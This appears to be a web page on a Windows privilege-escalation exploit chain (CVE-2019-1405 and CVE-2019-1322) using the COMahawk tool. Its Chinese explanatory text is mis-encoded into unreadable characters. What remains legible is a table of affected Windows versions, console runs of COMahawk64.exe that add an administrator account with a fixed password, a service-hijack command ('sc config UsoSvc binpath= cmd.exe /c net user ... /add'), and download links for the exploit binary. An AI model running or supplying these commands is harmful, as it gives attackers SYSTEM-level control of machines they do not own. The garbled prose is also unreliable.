Windows��Ȩ���� CVE-2019-1405 & CVE-2019-1322
http://k8gege.org/p/19321.html

### ©������

��NCC Group�о���Ա�����ֵ�����ͨ��COM���ط�����зǷ���Ȩ��©������һ��©��CVE-2019-1405��COM�����е�һ���߼����󣬿��ñ�����ͨ�û���LOCAL SERVICE���ִ����������ڶ���©��CVE-2019-1322��һ���򵥵ķ������ô��󣬿��ñ���SERVICE���е��κ��û�����������SYSTEMȨ�����еķ��񣨴�©��Ҳ�������о���Ա���֣�������������©�������һ��ʱ������������ͨ�û���SYSTEMȨ��ִ���������

ȫ������һЩWindows����,������LOCAL SERVICE��NETWORK SERVICE���е������û�������ִ�����ֹ��������оͰ���ǰ�������ᵽ��UPnP Device Host����,�������Ǿ����Ա��������û����,���ʹ��CVE-2019-1405��CVE-2019-1322������©��,�ɹ���Windows 10(1803��1903)ϵͳ�Ͻ�Ȩ��������SYSTEM�û���

### ©���汾
Vendor 	Product 	Versions
Microsoft	Windows 10	-, 1607, 1709, 1803, 1809, 1903
Microsoft	Windows 7	-
Microsoft	Windows 8.1	-
Microsoft	Windows Rt 8.1	-
Microsoft	Windows Server 2008	-, R2
Microsoft	Windows Server 2012	-, R2
Microsoft	Windows Server 2016	-, 1803, 1903
Microsoft	Windows Server 2019	-

### Ĭ����Ȩ
```Bash
C:\Users\null\Desktop>COMahawk64.exe
[\] Progress:  1/9 2/9 3/9 4/9 5/9 6/9 7/9 8/9 9/9
[+] Hopefully k8gege:K8gege520 is added as an admin.

C:\Users\null\Desktop>net user

\\DESKTOP-3F42O5D ���û��ʻ�

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest
k8gege                   null                     WDAGUtilityAccount
����ɹ���ɡ�
```

### ָ������
```Bash
C:\Users\null\Desktop>COMahawk64.exe "net user k8gege K8gege123? /add"
[+] Executing command [ sc config UsoSvc binpath= "cmd.exe /c net user k8gege K8gege123? /add" ]
[\] Progress:  1/6 2/6 3/6 4/6 5/6 6/6
[+] Command executed.
C:\Users\null\Desktop>net user

\\DESKTOP-3F42O5D ���û��ʻ�

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest
k8gege                   null                     WDAGUtilityAccount
����ɹ���ɡ�
```

### Win10��Ȩ
Teston Win10 X64 1803
<img src=http://k8gege.org/k8img/LPE/COMahawk.PNG></img>

### Exp

https://github.com/apt69/COMahawk

https://github.com/k8gege/K8tools/raw/master/Comahawk.rar